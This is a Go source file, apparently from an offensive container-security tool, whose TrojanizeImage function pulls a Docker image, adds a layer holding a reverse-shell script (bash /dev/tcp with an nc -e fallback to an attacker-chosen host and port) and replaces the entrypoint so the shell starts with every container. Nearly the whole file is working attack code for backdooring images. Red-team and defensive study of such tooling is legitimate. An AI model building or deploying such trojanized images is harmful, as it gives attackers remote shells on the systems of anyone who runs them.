package offensive

import (
	"archive/tar"
	"bytes"
	"fmt"
	"os"
	"runtime"

	"github.com/google/go-containerregistry/pkg/name"
	"github.com/google/go-containerregistry/pkg/v1"
	"github.com/google/go-containerregistry/pkg/v1/mutate"
	"github.com/google/go-containerregistry/pkg/v1/remote"
	"github.com/google/go-containerregistry/pkg/v1/tarball"
)

// TrojanizeImage takes a source image, injects a reverse shell script, 
// and saves it as a new tarball.
func TrojanizeImage(srcImage string, lhost string, lport string, outputPath string, platform string) error {
	// Default platform to host architecture if not specified
	if platform == "" {
		platform = runtime.GOARCH
	}
	
	// Normalize platform string (convert amd64 to linux/amd64, etc.)
	if !containsSlash(platform) {
		platform = "linux/" + platform
	}
	
	fmt.Printf("[*] Attempting to trojanize %s (platform: %s)...\n", srcImage, platform)

	// 1. Define the malicious payload (Reverse Shell)
	// Uses bash /dev/tcp if available, otherwise nc fallback
	payload := fmt.Sprintf(`#!/bin/bash
(bash -i >& /dev/tcp/%s/%s 0>&1 || nc -e /bin/bash %s %s || (echo "Reverse shell failed" && exec /bin/bash)) &
`, lhost, lport, lhost, lport)

	// 2. Create a Tar layer containing the payload
	// Layers in Docker are essentially tar files.
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	hdr := &tar.Header{
		Name: "usr/local/bin/dockerscan_init.sh",
		Mode: 0755,
		Size: int64(len(payload)),
	}
	if err := tw.WriteHeader(hdr); err != nil {
		return err
	}
	if _, err := tw.Write([]byte(payload)); err != nil {
		return err
	}
	if err := tw.Close(); err != nil {
		return err
	}

	// 3. Create a layer object from our tar buffer
	newLayer, err := tarball.LayerFromReader(&buf)
	if err != nil {
		return fmt.Errorf("failed to create layer: %v", err)
	}

	// 4. Fetch the remote image (e.g., from Docker Hub)
	ref, err := name.ParseReference(srcImage)
	if err != nil {
		return err
	}
	
	// Parse platform for manifest selection
	platParts := parsePlatform(platform)
	img, err := remote.Image(ref, remote.WithPlatform(v1.Platform{
		OS:           platParts.OS,
		Architecture: platParts.Arch,
	}))
	if err != nil {
		return fmt.Errorf("failed to pull image: %v", err)
	}

	// 5. Append the new layer to the image
	imgWithLayer, err := mutate.AppendLayers(img, newLayer)
	if err != nil {
		return err
	}

	// 6. Modify the Config (Entrypoint) 
	// This ensures the malicious script runs every time the container starts
	cfg, err := imgWithLayer.ConfigFile()
	if err != nil {
		return err
	}
	
	// Prepend our script to the existing Entrypoint
	cfg.Config.Entrypoint = []string{"/bin/sh", "/usr/local/bin/dockerscan_init.sh"}
	
	// Create the final image with the modified config
	finalImg, err := mutate.Config(imgWithLayer, cfg.Config)
	if err != nil {
		return err
	}

	// 7. Save the trojanized image to a local .tar file
	outFile, err := os.Create(outputPath)
	if err != nil {
		return err
	}
	defer outFile.Close()

	if err := tarball.Write(ref, finalImg, outFile); err != nil {
		return err
	}

	fmt.Printf("[+] Success! Trojanized image saved to: %s\n", outputPath)
	return nil
}

// Platform holds OS and architecture info
type Platform struct {
	OS   string
	Arch string
}

// containsSlash checks if a string contains a forward slash
func containsSlash(s string) bool {
	for _, c := range s {
		if c == '/' {
			return true
		}
	}
	return false
}

// parsePlatform extracts OS and architecture from a platform string (e.g., "linux/amd64")
func parsePlatform(platform string) Platform {
	var os, arch string
	for i := 0; i < len(platform); i++ {
		if platform[i] == '/' {
			os = platform[:i]
			arch = platform[i+1:]
			break
		}
	}
	// Fallback if no slash found
	if os == "" {
		os = "linux"
		arch = platform
	}
	return Platform{OS: os, Arch: arch}
}